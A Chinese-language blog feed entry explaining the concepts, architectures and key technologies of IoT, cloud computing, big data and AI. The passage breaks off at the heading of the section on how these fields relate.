    <link href="http://www.firehacker.top/2018/08/18/%E5%A4%A7%E6%95%B0%E6%8D%AE-AI-%E4%BA%91-IOT%E5%85%B3%E7%B3%BB%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/08/18/大数据-AI-云-IOT关系浅析/</id>
    <published>2018-08-18T04:50:04.000Z</published>
    <updated>2018-08-18T09:22:15.043Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>近几年，随着互联网技术的发展与计算能力的提升，大数据，云计算，物联网，人工智能等概念越来与火热，那么这概念的诞生，发展，技术背景，以及这些“新技术”之间的关系又怎样？本文对网络上的相关资料(国内的版权意识及环境较差，部分文章出处难以考证)梳理一二，便于查阅与理解<br><a id="more"></a></p></blockquote><hr><h2 id="0x01-物联网-IOT"><a href="#0x01-物联网-IOT" class="headerlink" title="0x01 物联网 (IOT)"></a>0x01 物联网 (IOT)</h2><h3 id="1-IOT概念"><a href="#1-IOT概念" class="headerlink" title="1. IOT概念"></a>1. IOT概念</h3><p><strong>(1) 早期</strong></p><p>通过射频识别（RFID）、红外线感应器、全球定位系统、激光扫描器、气体感应器等信息传感设备按约定的协议把任何物品与互联网连接起来进行信息交换，以实现智能化识别、定位、跟踪、监控和管理的一种网络，简言之物联网就是“<strong>物物相连</strong>的互联网”</p><p><strong>（2）现今</strong></p><p>当下几乎所有技术与计算机、互联网技术的结合，实现物体与物体之间：环境以及状态信息实时的实时共享以及智能化的收集、传递、处理、执行。广义上说，当下涉及的信息技术的应用，都可以纳入物联网的范畴，所谓的“<strong>万物智联</strong>”- Internet of things</p><h3 id="2-关键技术"><a href="#2-关键技术" class="headerlink" title="2. 关键技术"></a>2. 关键技术</h3><p><strong>（1）传感器技术</strong></p><p>这也是计算机应用中的关键技术。到目前为止绝大部分计算机处理的都是数字信号。自从有计算机以来就需要<strong>传感器</strong>把<strong>模拟信号</strong>转换成<strong>数字信号</strong>计算机才能处理</p><p><strong>（2）RFID标签</strong></p><p>一种传感器技术，RFID技术是融合了<strong>无线射频</strong>技术和<strong>嵌入式</strong>技术为一体的综合技术，RFID在自动识别、物品物流管理有着广阔的应用前景</p><p><strong>（3）嵌入式系统技术</strong></p><p>综合了计算机软硬件、传感器技术、集成电路技术、电子应用技术为一体的复杂技术。经过几十年的演变，以嵌入式系统为特征的智能终端产品随处可见。如果把物联网用人体做一个简单比喻，<strong>传感器</strong>相当于人的眼睛、鼻子、皮肤等<strong>感官</strong>，<strong>网络</strong>就是神经系统用来<strong>传递信息</strong>，<strong>嵌入式系</strong>统则是人的大脑，在接收到信息后要进行<strong>分析处理</strong></p><h3 id="3-体系架构"><a href="#3-体系架构" class="headerlink" title="3. 体系架构"></a>3. 体系架构</h3><p><img src="http://pdn6x28ho.bkt.clouddn.com/IOT%E6%9E%B6%E6%9E%84.png" alt=""></p><p><strong>（1）元素层</strong></p><p>信息科学中的自然现象和效应，是各种基础信息科学的集合，是构建器件层的基础(物联网最基本的技术元素)。包括电学、电磁感应、微波原理、电路理论等等</p><p><strong>（2）器件层</strong></p><p>信息产业中的基本元器件，主要是各类电子元器件、电路模组和功能板件，包括芯片、电路板卡、电源、存储器、信号输出输入设备，传感器和执行器。在这一层，“软件”除了包括电路设计外，还包括嵌入式开发的程序，在电子器件出厂前，其内部的“软件”就基本固定了</p><p><strong>（3）终端和节点层</strong></p><p><strong>物理实体</strong></p><p><strong>A、物联网的终端：</strong>包括非智能终端(也称“哑终端”，一般没有数据处理的能力，只能通过网络上报传感数据，或接受操控数据)、智能终端设备(例如工业机器人)、用户智能终端(手机、笔记本)。</p><p><strong>B、专用的信息处理节点</strong>：网络设备、计算设备、存储设备。虽然这些节点都具备网络接口、计算和存储器件，但是它们通常都提供某一种专用的信息能力。就比如：运营商IP承载网中的路由器(网络)、云计算中的刀片服务器(计算)</p><p><strong>该层“软件”</strong></p><p>主要为各种终端程序，包括嵌入式程序、操作系统、中间件、通用或定制的应用软件等</p><p><strong>（4）资源汇聚层</strong></p><p><strong>信息资源</strong></p><p>主要包括三种核心的信息处理的资源和能力：<strong>网络</strong>(无线网络覆盖、IP骨干网络、互联网及运营商网络的互联)、<strong>计算</strong>(云计算、大数据、机器学习)和<strong>存储</strong>(云存储、数据库)</p><p><strong>该层的“软件”</strong></p><p>除了终端中运行的各种程序以外，还包括各类信息互通的协议标准、流程规范、服务接口等等。在这一层，信息化能力已经具有了语义化的特征，具备了一定的开放性，并持续朝着更加开放、灵活、模块化的方向发展</p><p><strong>（5）平台服务层</strong></p><p><strong>语义化</strong></p><p>在该层，不仅信息技术被语义化地定义，其它行业技术和实体也实现了<strong>语义化</strong></p><p>为了承载各行业领域的数字化转型，物联网所包含的各类信息技术自身就必须做到语义化。在物联网技术领域之外，各行业的资源和能力，也在此处被模块化封装，通过标准化的信息接口向外界提供服务，应用的开发和运营者可以随取随用</p><p><strong>词汇集</strong></p><p>该层也提供软件开发、运营的工具，便于各类行业系统对技术和设施的使用、组合、评测、维护。在平台服务层，形成了物联网应用的词典(词汇集)，各类物联网的资源(设施)是“名词”、各种信息处理功能是“动词”，开发人员将可以将主要精力放置在构建“语句”和“段落”(应用的逻辑功能)上，并最终书写出完整篇章(应用系统、商业体系)</p><p><strong>“软件”及语言</strong></p><p>在这一层中，“软件”包括了物联网服务平台的架构、中间件、接口标准、信息服务规范等等，也融合了各行业中的一些基础性的技术服务(比如平台可以提供气象预测的服务)</p><p>在这一层，各行业的一些已经模块化的技术，能够通过信息产业的(程序化)封装，向外界提供开放式的服务，以形成各行业在物联网中的公共性语言(词汇)</p><p>不过，这种语言并不是服务于“人”的语言，而是“物”与“物”，即设备、系统之间用以信息交流的语言工具。只要掌握了某种物联网应用的“语言”，那么任何设备都可以理解该应用数据的涵义，使用此应用的物联网服务，操作远端设备并获得反馈</p><p><strong>（6）应用层</strong></p><p>对物联网行业应用的<strong>设计、搭建、运营</strong>。开发者和运营者在应用层，选取所需的资源和功能(包括信息技术和行业技术)，通过对下层服务的调用，构建自己的行业应用。在物联网技术层级的体系中，应用层之下的五层，都可以理解为应用层的“硬件”；“软件”则是应用开发者自己编写的应用逻辑</p><p>如果应用软件承载于SAAS(软件即服务)之上，系统底层设备由云计算服务商提供，那么在应用中可能就看不到任何物理实体的“硬件”，取而代之的，是下层模块化、标准化的信息服务和行业功能</p><h3 id="4-IOT两个域"><a href="#4-IOT两个域" class="headerlink" title="4. IOT两个域"></a>4. IOT两个域</h3><p>信息流“接入”和“汇聚”的两种需求，将物联网的技术自然地分成了“<strong>边缘</strong>”和“<strong>云端</strong>”两个“域”</p><p><strong>（1）边缘域</strong></p><p>无数设备需要联网，接近<strong>物理实体</strong>现场的“边缘域”，应用和功能更倾向于需要实时性的反馈操作；<strong>边缘网络</strong>中有各类终端配备传感器——用以感知物理世界，部署各种类型的网络协议，包括了有线网络和无线网络、“对等网络协议”和“非对等网络</p><p><strong>（2）云端域</strong></p><p>远离现实物件，但<strong>信息集中</strong>汇聚的“云端域”，应用更倾向于抽象化的预测分析、海量数据检索等等；<strong>云端网络</strong>中的设备则只有标准的信号输出输入接口，云端域”只有<strong>对等网络</strong>协议，例如IPv4、IPv6</p><hr><h2 id="0x02-云计算"><a href="#0x02-云计算" class="headerlink" title="0x02 云计算"></a>0x02 云计算</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><p><strong>DIS版：</strong>云计算是一种将可伸缩、弹性、共享的物理和虚拟资源池以按需自服务的方式供应和管理，并提供网络访问的模式。云计算模式由关键特征、云计算角色和活动、云能力类型和云服务分类、云部署模型、云计算共同关注点组成</p><p><strong>NIST版：</strong>云计算是一种按使用量付费的模式，这种模式提供可用的、便捷的、按需的网络访问， 进入可配置的计算资源共享池（资源包括网络，服务器，存储，应用软件，服务），这些资源能够被快速提供，只需投入很少的管理工作，或与服务供应商进行很少的交互</p><h3 id="2-部署模式"><a href="#2-部署模式" class="headerlink" title="2. 部署模式"></a>2. 部署模式</h3><p><strong>（1）公有云</strong></p><p>云基础设施对公众或某个很大的业界群组提供云服务</p><p><strong>（2）私有云</strong></p><p>云基础设施特定为某个组织运行服务，可以是该组织或某个第三方负责管理，可以是场内服务（on-premises），也可以是场外服务（off-premises）</p><p><strong>（3）社区云</strong></p><p>云基础设施由若干个组织分享，以支持某个特定的社区。社区是指有共同诉求和追求的团体（，和私有云类似，社区云可以是该组织或某个第三方负责管理，可以是场内服务，也可以是场外服务</p><p><strong>（4）混合云</strong></p><p>云基础设施由两个或多个云（私有云、社区云或公有云）组成，独立存在，但是通过标准的或私有的技术绑定在一起，这些技术可促成数据和应用的可移植性</p><h3 id="3-服务类型"><a href="#3-服务类型" class="headerlink" title="3. 服务类型"></a>3. 服务类型</h3><p><img src="http://pdn6x28ho.bkt.clouddn.com/%E4%BA%91%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84.png" alt=""></p><p><strong>（1）Iaas (基础设施即服务)</strong></p><p>根据用户的需求提供计算资源,将硬件设备等有形的<strong>基础设施资源</strong>进行封装,作为服务提供给用户使用。laaS为用户提供了处理、存储、网络等功能和计算资源,用户可以在上面随意运行任何软件。云还提供了弹性的服务资源和动态要求服务质量和能力的功能,因此用户能够根据需求随时动态请求资源服务。laaS为用户提供资源抽象、资源监控、资源部署、负载管理、安全管理、数据管理和计费管理七个功能。laaS主要是为用户提供虚拟机或者其它资源等服务,其主要用户是<strong>系统管理员</strong></p><p><strong>（2）Paas (平台即服务)</strong></p><p>根据用户需求提供基于互联网的应用开发环境和存储服务，主要是将为用户提供一个<strong>开发平台</strong>,方便编写和测试程序,其主要用户是程序<strong>开发人员</strong></p><p><strong>（3）Saas (软件即服务)</strong></p><p>以服务访问的形式访问网络上的软件,为用户提供运行在云基础设施上的<strong>应用软件</strong>，主要为用户提供各种应用,其面对的主要是<strong>普通用户</strong></p><h3 id="4-参考架构-CCRA"><a href="#4-参考架构-CCRA" class="headerlink" title="4. 参考架构 (CCRA)"></a>4. 参考架构 (CCRA)</h3><p><img src="http://pdn6x28ho.bkt.clouddn.com/CCRA%E6%9E%B6%E6%9E%84.png" alt=""></p><h3 id="5-支撑技术"><a href="#5-支撑技术" class="headerlink" title="5. 支撑技术"></a>5. 支撑技术</h3><p><strong>（1）系统虚拟化</strong></p><p>系统虚拟化是指将一台物理计算机系统虚拟化为一台或多台虚拟计算机系统。每个虚拟计算机系统（简称虚拟机）都拥有自己的虚拟硬件（如 CPU、内存和设备等），来提供一个独立的虚拟机执行环境。通过虚拟化层的模拟，虚拟机中的操作系统认为自己仍然是独占一个系统在运行。每个虚拟机中的操作系统可以完全不同，并且它们的执行环境是完全独立的。这个虚拟化层被称为虚拟机监控器（Virtual Machine Monitor，简称 VMM）</p><p><img src="http://pdn6x28ho.bkt.clouddn.com/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96.png" alt=""></p><p>VMM 对物理资源的虚拟可以归结为三个主要任务：CPU 虚拟化、内存虚拟化和 I/O 虚拟化。CPU 虚拟化是 VMM 中最核心的部分，决定了内存虚拟化和 I/O虚拟化的正确实现。<strong>CPU 虚拟化</strong>包括指令的模拟、中断和异常的模拟及注入和对称多处理器技术的模拟。<strong>内存虚拟化</strong>一方面解决了 VMM 和客户机操作系统对物理内存认识上的差异，另一方面在虚拟机之间、虚拟机和 VMM 之间进行隔离，防止某个虚拟机内部的活动影响到其他的虚拟机甚至是 VMM 本身，从而造成安全上的漏洞。<strong>I/O 虚拟化</strong>主要是为了满足多个客户机操作系统对外围设备的访问需求，通过访问截获、设备模拟和设备共享等方式复用外设</p><p><strong>（2）虚拟化资源管理</strong></p><p>虚拟化资源是云计算中最重要的组成部分之一，对虚拟化资源的管理水平直接影响云计算的可用性、可靠性和安全性。虚拟化资源管理主要包括对虚拟化资源的监控、分配和调度，在虚拟化资源管理调度接口方面，表述性状态转移（Representational State Transfer，简称 <strong>REST</strong>）有能力成为虚拟化资源管理强有力的支撑</p><p>云资源池中应用的需求不断改变，在线服务的请求经常不可预测，这种动态的环境要求云计算的数据中心或计算中心能够对各类资源进行灵活、快速、动态的按需调度</p><p><strong>（3）分布式数据存储</strong></p><p>分布式数据存储技术包含非结构化数据存储和结构化数据存储。其中，非结构化数据存储主要采用文件存储和对象存储技术，而结构化数据存储主要采用分布式数据库技术，特别是 NoSQL 数据库</p><p>A. <strong>分布式文件系统</strong></p><p>为了存储和管理云计算中的海量数据，Google 提出分布式文件系统 <strong>GFS</strong>（Google File System），Apache Hadoop项目的 HDFS 实现了 GFS 的开源版本。GFS/HDFS 非常适于进行以<strong>大文件形式</strong>存储的海量数据的并行处理，但是，当文件系统的文件数量持续上升时，元数据服务器的可扩展性面临极限</p><p>B. <strong>分布式对象存储系统</strong></p><p>与分布式文件系统不同，分布式对象存储系统不包含树状名称空间（Namespace），因此在<strong>数量增长</strong>时可以更有效地将元数据平衡地分布到多个结点上，提供理论上无限的可扩展性</p><p>C. <strong>分布式数据库管理系统</strong></p><p>传统的单机数据库采用“<strong>向上扩展</strong>”的思路来解决计算能力和存储能力的问题，即增加 CPU 处理能力、内存和磁盘数量。这种系统目前最大能够支持几个 TB 数据的存储和处理，远不能满足实际需求。采用<strong>集群设计</strong>的分布式数据库逐步成为主流</p><p><strong>（4）并行计算模式</strong></p><p>并行计算模型是<strong>提高海量数据处理效率</strong>的常用方法。常用的并行计算模型主要包括两类：一类是面向高性能计算的，如 MPI(Message Passing Interface)模型；另一类是面向互联网数据密集型应用的并行编程模型，如 Google 的MapReduce 模型、微软的 Dryad 模型</p><p><strong>（5）用户交互技术</strong></p><p>云计算的逐步普及，浏览器已经不仅仅是一个客户端的软件，而逐步演变为承载着互联网的平台。浏览器与云计算的整合技术主要体现在两个方面：浏览器<strong>网络化</strong>与浏览器<strong>云服务</strong></p><p>目前的浏览器云服务主要体现在 <strong>P2P 下载、视频加速</strong>等单独的客户端软件中，主要的应用研究方向包括：基于浏览器的 P2P 下载、视频加速、分布式计算、多任务协同工作等。在多任务协同工作方面,<strong>AJAX</strong>（Asynchronous JavaScript and XML，异步 JavaScript 和 XML)是一种创建交互式网页应用的网页开发技术，改变了传统网页的交互方式，改进了交互体验</p><p><strong>（6）安全管理</strong></p><p>云计算的多租户、分布性、对网络和服务提供者的依赖性，为安全问题带来新的挑战，数据安全问题及风险(数据存储及访问控制，数据传输保护，数据隐私及敏感信息保护，数据可用性，依从性管理)依旧严峻，相应安全管理技术(数据保护及隐私（Data Protection and Privacy），身份及访问管理（Identity and Access Management,简称 IAM），数据传输（Data Transportation），可用性管理（Availability Management），日志管理（Log Management），审计管理（Audit Management），依从性管理(Compliance Management))的发展为其提供保障</p><hr><h2 id="0x03-大数据-Bigdata"><a href="#0x03-大数据-Bigdata" class="headerlink" title="0x03 大数据 (Bigdata )"></a>0x03 大数据 (Bigdata )</h2><h3 id="1-概念定义"><a href="#1-概念定义" class="headerlink" title="1. 概念定义"></a>1. 概念定义</h3><p>无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产，大数据的主要特点为<strong>数据量大</strong>（Volume），<strong>数据类别复杂</strong>（Variety），<strong>数据处理速度快</strong>（Velocity）和<strong>数据真实性高</strong>（Veracity），合起来被称为4V</p><h3 id="2-大数据分析技术"><a href="#2-大数据分析技术" class="headerlink" title="2. 大数据分析技术"></a>2. 大数据分析技术</h3><p><strong>（1）可视化分析（Analytic Visualization）</strong></p><p>普通消费者常常<strong>可以见到</strong>的一种大数据分析结果的表现形式，可视化分析将大量复杂的数据自动转化成<strong>直观形象</strong>的图表，使其能够更加容易的被普通消费者所接受和理解</p><p><strong>（2）数据挖掘算法（Date Mining Algorithms）</strong></p><p>大数据分析的理论核心，其本质是一组根据<strong>算法</strong>事先定义好的<strong>数学公式</strong>，将收集到的数据作为参数变量带入其中，从而能够从大量复杂的数据中<strong>提取</strong>到有价值的信息。亚马逊的推荐引擎和谷歌的广告系统都大量使用了数据挖掘算法</p><p><strong>（3）预测性分析能力（Predictive Analytic Capabilities）</strong></p><p>大数据分析最重要的应用领域，从大量复杂的数据中挖掘出规律，建立起科学的事件模型，通过将新的数据带入模型，就可以预测未来的事件走向。预测性分析能力常常被应用在金融分析和科学研究领域，用于股票预测或气象预测等</p><p><strong>（4）语义引擎（Semantic Engines）</strong></p><p>通过对大量复杂的数据进行分析，让计算机从中自我学习，可以使计算机能够尽量精确的了解用户输入内容的意思，从而把握住用户的需求，提供更好的用户体验</p><p><strong>（5）数据质量管理（Data Quality Management）</strong></p><p>为了保证大数据分析结果的准确性，需要将大数据中不真实的数据剔除掉，保留最准确的数据。这就需要建立有效的数据质量管理系统，分析收集到的大量复杂的数据，挑选出真实有效的数据</p><h3 id="3-技术基础"><a href="#3-技术基础" class="headerlink" title="3. 技术基础"></a>3. 技术基础</h3><p><strong>（1）分布式计算（Distributed Computing）</strong></p><p><strong>基本概念</strong></p><p>把一组计算机通过网络相互连接组成<strong>分散系统</strong>，然后将需要处理的大量数据分散成多个部分，交由分散系统内的计算机组同时计算，最后将这些计算结果合并得到最终的结果</p><p><strong>模型(Google)</strong></p><p>MapReduce是分布式<strong>计算框架</strong>，GFS（Google File System）是分布式<strong>文件系统</strong>，BigTable是基于Google File System的<strong>数据存储系统</strong></p><p><strong>主流分布式计算系统</strong></p><p>A. <strong>Hadoop</strong></p><p>Apache基金会的开源项目，采用MapReduce分布式计算框架，并根据GFS开发了HDFS分布式文件系统，根据BigTable开发了HBase数据存储系统，常用于<strong>离线</strong>的<strong>复杂</strong>的大数据处理</p><p>B. <strong>Spark</strong></p><p>Apache基金会的开源项目，它由加州大学伯克利分校的实验室开发，在Hadoop的基础上进行了一些架构上的改良。<strong>Hadoop</strong>使用<strong>硬盘</strong>来存储数据，而<strong>Spark</strong>使用<strong>内存</strong>来存储数据，因此Spark可以提供超过Hadoop100倍的运算速度，但是，由于内存断电后会丢失数据，Spark不能用于处理需要长期保存的数据，常用于<strong>离线</strong>的<strong>快速</strong>的大数据处理</p><p>C. <strong>Storm</strong></p><p>Twitter主推的分布式计算系统，它由BackType团队开发，是Apache基金会的孵化项目。它在Hadoop的基础上提供了<strong>实时运算</strong>的特性，可以实时的处理大数据流。不同于Hadoop和Spark，Storm不进行数据的收集和存储工作，它直接通过网络实时的接受数据并且实时的处理数据，然后直接通过网络实时的传回结果。常用于<strong>在线</strong>的<strong>实时</strong>的大数据处理</p><p><strong>（2）服务器集群（Server Cluster）</strong></p><p>服务器集群是一种提升服务器整体计算能力的解决方案。它是由互相连接在一起的服务器群所组成的一个并行式或分布式系统。服务器集群中的服务器运行同一个计算任务。因此，从外部看，这群服务器表现为一台虚拟的服务器，对外提供统一的服务</p><hr><h2 id="0x04-人工智能-AI"><a href="#0x04-人工智能-AI" class="headerlink" title="0x04 人工智能(AI)"></a>0x04 人工智能(AI)</h2><h3 id="1-发展史"><a href="#1-发展史" class="headerlink" title="1. 发展史"></a>1. 发展史</h3><p><img src="http://pdn6x28ho.bkt.clouddn.com/AI%E5%8F%91%E5%B1%95%E5%8F%B2.png" alt=""></p><h3 id="2-概念定义"><a href="#2-概念定义" class="headerlink" title="2. 概念定义"></a>2. 概念定义</h3><p><strong>维基百科版</strong></p><p>“人工智能就是机器展现出的智能”，即只要是某种机器，具有某种或某些“智能”的特征或表现，都应该算作“人工智能”</p><p><strong>百度百科版</strong></p><p>人工智能是“研究、开发用于模拟、延伸和扩展人的智能的理论、方法、技术及应用系统的一门新的技术科学”，将其视为计算机科学的一个分支，指出其研究包括机器人、语言识别、图像识别、自然语言处理和专家系统等</p><h3 id="3-分类"><a href="#3-分类" class="headerlink" title="3. 分类"></a>3. 分类</h3><p><strong>（1）弱人工智能</strong></p><p>不能真正实现推理和解决问题的智能机器，<strong>无自主意识</strong>。迄今为止的人工智能系统都还是实现特定功能的专用智能，而不是像人类智能那样能够不断适应复杂的新环境并不断涌现出新的功能，因此都还是弱人工智能。目前的主流研究仍然集中于弱人工智能，并取得了显著进步，如语音识别、图像处理和物体分割、机器翻译等方面取得了重大突破，甚至可以接近或超越人类水平</p><p><strong>（2）强人工智能</strong></p><p>指真正<strong>能思维</strong>的智能机器，并且认为这样的机器是有<strong>知觉</strong>的和<strong>自我意识</strong>的，这类机器可分为类人（机器的思考和推理类似人的思维）与非类人（机器产生了和人完全不一样的知觉和意识，使用和人完全不一样的推理方式）两大类。从一般意义来说，达到人类水平的、能够自适应地应对外界环境挑战的、具有自我意识的人工智能称为“通用人工智能”、“强人工智能”或“类人智能”</p><p><strong>仿真主义</strong></p><ul><li><p>仿真主义可以说是符号主义、连接主义、行为主义和统计主义之后的第五个流派。这条新路线通过制造先进的大脑探测工具从结构上解析大脑，再利用工程技术手段构造出模仿大脑神经网络基元及结构的仿脑装置，最后通过环境刺激和交互训练仿真大脑实现类人智能，简言之，“<strong>先结构，后功能</strong>”</p></li><li><p><strong>经典计算机</strong>是数理逻辑的开关电路实现，采用<strong>冯•诺依曼体系结构</strong>，可以作为逻辑推理等专用智能的实现载体。但要靠经典计算机不可能实现强人工智能。要按仿真主义的路线“仿脑”，就必须设计制造全新的软硬件系统，这就是“<strong>类脑计算机</strong>”，或者更准确地称为“<strong>仿脑机</strong>”。“仿脑机”是“仿真工程”的标志性成果，也是“仿脑工程”通向强人工智能之路的重要里程碑</p></li></ul><h3 id="4-参考框架"><a href="#4-参考框架" class="headerlink" title="4. 参考框架"></a>4. 参考框架</h3><p><img src="http://pdn6x28ho.bkt.clouddn.com/AI%E6%A1%86%E6%9E%B6.png" alt=""></p><p>提供了基于<strong>“角色—活动—功能”</strong>的层级分类体系，从“智能信息链”（水平轴）和“IT 价值链”（垂直轴）两个维度阐述了人工智能系统框架。<strong>“智能信息链”</strong>反映从智能信息感知、智能信息表示与形成、智能推理、智能决策、智能执行与输出的一般过程。在这个过程中，智能信息是流动的载体，经历了“数据—信息—知识—智慧”的凝练过程。<strong>“IT 价值链”</strong>从人工智能的底层基础设施、信息（提供和处理技术实现）到系统的产业生态过程，反映人工智能为信息技术产业带来的价值</p><h3 id="5-关键技术"><a href="#5-关键技术" class="headerlink" title="5. 关键技术"></a>5. 关键技术</h3><p><strong>（1）机器学习（Machine Learning）</strong></p><p>研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或技能，重新组织已有的知识结构使之不断改善自身的性能的学科技术。基于数据的机器学习是现代智能技术中的重要方法之一，研究从观测数据（样本）出发寻找规律，利用这些规律对未来数据或无法观测的数据进行预测</p><p><strong>分类-根据学习模式</strong></p><p>A. <strong>监督学习</strong></p><p>利用<strong>已标记</strong>的有限训练数据集，通过某种学习策略/方法建立一个模型，实现对新数据/实例的标记（分类）/映射，最典型的监督学习算法包括<strong>回归</strong>和<strong>分类</strong>。监督学习要求训练样本的分类标签已知，分类标签精确度越高，样本越具有代表性，学习模型的准确度越高。监督学习在自然语言处理、信息检索、文本挖掘、手写体辨识、垃圾邮件侦测等领域获得了广泛应用</p><p>B. <strong>无监督学习</strong></p><p>利用<strong>无标记</strong>的有限数据描述隐藏在未标记数据中的结构/规律，最典型的非监督学习算法包括<strong>单类密度估计、单类数据降维、聚类</strong>等。无监督学习不需要训练样本和人工标注数据，便于压缩数据存储、减少计算量、提升算法速度，还可以避免正、负样本偏移引起的分类错误问题。主要用于经济预测、异常检测、数据挖掘、图像处理、模式识别等领域</p><p>C. <strong>强化学习</strong></p><p>智能系统<strong>从环境到行为映射</strong>的学习，以使强化信号函数值最大。强化学习的目标是学习从环境状态到行为的映射，使得智能体选择的行为能够获得环境最大的奖赏，使得外部环境对学习系统在某种意义下的评价为最佳。其在机器人控制、无人驾驶、下棋、工业控制等领域获得成功应用</p><p><strong>分类-根据学习方法</strong></p><p>A. <strong>传统机器学习</strong></p><p>从一些观测（训练）样本出发，试图发现不能通过原理分析获得的规律，实现对未来数据行为或趋势的准确预测。相关算法包括<strong>逻辑回归、隐马尔科夫方法、支持向量机方法、K 近邻方法、三层人工神经网络方法、Adaboost算法</strong>、<strong>贝叶斯方法</strong>以及<strong>决策树方法</strong>等</p><p>传统机器学习平衡了学习结果的<strong>有效性</strong>与学习模型的<strong>可解释性</strong>，为解决有限样本的学习问题提供了一种框架，主要用于<strong>有限样本</strong>情况下的<strong>模式分类、回归分析、概率密度估计</strong>等。传统机器学习方法共同的重要理论基础之一是<strong>统计学</strong>，在自然语言处理、语音识别、图像识别、信息检索和生物信息等许多计算机领域获得了广泛应用</p><p>B. <strong>深度学习</strong></p><p>深度学习是建立<strong>深层结构模型</strong>的学习方法，典型的深度学习算法包括<strong>深度置信网络、卷积神经网络、受限玻尔兹曼机</strong>和<strong>循环神经网络</strong>等</p><p>深度学习又称为深度神经网络（指层数<strong>超过3 层</strong>的神经网络）。深度学习源于<strong>多层神经网络</strong>，其实质是给出了一种将<strong>特征表示和学习合二为一</strong>的方式。深度学习的特点是放弃了可解释性，单纯追求学习的有效性</p><p>经过多年的摸索尝试和研究，已经产生了诸多深度神经网络的模型，其中<strong>卷积神经网络、循环神经网络</strong>是两类典型的模型。卷积神经网络常被应用于空间性分布数据；循环神经网络在神经网络中引入了记忆和反馈，常被应用于时间性分布数据</p><p><strong>深度学习框架</strong>是进行深度学习的基础底层框架，一般包含主流的神经网络算法模型，提供稳定的深度学习 API，支持训练模型在服务器和 GPU、TPU 间的分布式学习，部分框架还具备在包括移动设备、13云平台在内的多种平台上运行的移植能力，从而为深度学习算法带来前所未有的运行速度和实用性。目前主流的开源算法框架有 <strong>TensorFlow、Caffe/Caffe2、CNTK、MXNet、Paddle-paddle、Torch/PyTorch、Theano</strong> 等</p><p><strong>（2）知识图谱</strong></p><p>本质上是<strong>结构化</strong>的<strong>语义知识库</strong>，是一种由节点和边组成的<strong>图</strong>数据结构，以符号形式描述物理世界中的概念及其相互关系，其基本组成单位是<strong>“实体—关系—实体”</strong>三元组，以及实体及其相关“属性—值”对。不同实体之间通过关系相互联结，构成网状的知识结构。在知识图谱中，每个节点表示现实世界的“实体”，每条边为实体与实体之间的“关系”</p><p>知识图谱可用于<strong>反欺诈、不一致性验证、组团欺诈</strong>等公共安全保障领域，需要用到异常分析、静态分析、动态分析等数据挖掘方法</p><p><strong>（3）自然语言处理</strong></p><p>研究能实现人与计算机之间用自然语言进行有效通信的各种理论和方法，涉及的领域较多，主要包括<strong>机器翻译、机器阅读理解</strong>和<strong>问答系统</strong>等</p><p><strong>（4）人机交互</strong></p><p>主要研究人和计算机之间的<strong>信息交</strong>换，主要包括人到计算机和计算机到人的两部分信息交换，是人工智能领域的重要的外围技术。人机交互是与认知心理学、人机工程学、多媒体技术、虚拟现实技术等密切相关的综合学科。人机交互技术除了传统的基本交互和图形交互外，还包括<strong>语音交互、情感交互、体感交互</strong>及<strong>脑机交互</strong>等技术</p><p><strong>（5）计算机视觉</strong></p><p>计算机视觉是使用计算机<strong>模仿人类视觉系统</strong>的科学，让计算机拥有类似人类提取、处理、理解和分析图像以及图像序列的能力。自动驾驶、机器人、智能医疗等领域均需要通过计算机视觉技术从视觉信号中提取并处理信息。近来随着深度学习的发展，预处理、特征提取与算法处理渐渐融合，形成<strong>端到端</strong>的人工智能算法技术。根据解决的问题，计算机视觉可分为<strong>计算成像学、图像理解、三维视觉、动态视觉</strong>和<strong>视频编解码</strong>五大类</p><p><strong>（6）生物特征识别</strong></p><p>生物特征识别技术是指通过个体<strong>生理特征</strong>或<strong>行为特征</strong>对个体身份进行识别<strong>认证</strong>的技术</p><p>从应用流程看，生物特征识别通常分为<strong>注册</strong>和<strong>识别</strong>两个阶段。<strong>注册阶段</strong>通过传感器对人体的生物表征信息进行采集，如利用图像传感器对指纹和人脸等光学信息、麦克风对说话声等声学信息进行采集，利用数据预处理以及特征提取技术对采集的数据进行处理，得到相应的特征进行存储。<strong>识别过程</strong>采用与注册过程一致的信息采集方式对待识别人进行信息采集、数据预处理和特征提取，然后将提取的特征与存储的特征进行比对分析，完成识别。从应用任务看，生物特征识别一般分为辨认与确认两种任务，辨认是指从存储库中确定待识别人身份的过程，是一对多的问题；确认是指将待识别人信息与存储库中特定单人信息进行比对，确定身份的过程，是一对一的问题</p><p>生物特征识别技术涉及的内容十分广泛，包括<strong>指纹、掌纹、人脸、虹膜、指静脉、声纹、步态</strong>等多种生物特征，其识别过程涉及到图像处理、计算机视觉、语音识别、机器学习等多项技术</p><p><strong>（7）虚拟现实/增强现实</strong></p><p>虚拟现实（VR）/增强现实（AR）是以计算机为核心的新型视听技术。结合相关科学技术，在一定范围内生成与真实环境在视觉、听觉、触感等方面高度近似的数字化环境。用户借助必要的装备与数字化环境中的对象进行交互，相互影响，获得近似真实环境的感受和体验，通过显示设备、跟踪定位设备、触力觉交互设备、数据获取设备、专用芯片等实现</p><hr><h2 id="0x05-相互关系"><a href="#0x05-相互关系" class="headerlink" title="0x05 相互关系"></a>0x05 